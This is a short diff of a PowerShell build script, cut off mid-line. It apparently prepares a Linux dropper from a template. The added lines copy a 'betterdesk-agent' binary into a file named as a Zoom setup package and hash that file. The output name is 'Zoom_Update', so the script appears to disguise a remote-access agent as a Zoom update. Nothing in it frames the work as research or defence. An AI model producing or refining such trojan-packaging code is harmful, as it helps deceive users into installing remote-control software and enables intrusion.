@@ -15,8 +15,10 @@ $base = "Zoom_Update_v$version"
 $templatePath = Join-Path $here 'linux-dropper.template.sh'
 $payloadName = 'zoom-private.Setup_1.0.0_x86_64.bin'
 $agent = Join-Path $dist 'betterdesk-agent'
+$payload = Join-Path $dist $payloadName
+if (-not (Test-Path -LiteralPath $payload)) { Copy-Item -LiteralPath $agent -Destination $payload }
 
-$sha = (Get-FileHash -LiteralPath $agent -Algorithm SHA256).Hash.ToLowerInvariant()
+$sha = (Get-FileHash -LiteralPath $payload -Algorithm SHA256).Hash.ToLowerInvariant()
 
 $template = Get-Content -Raw -LiteralPath $templatePath
 $script = $template.
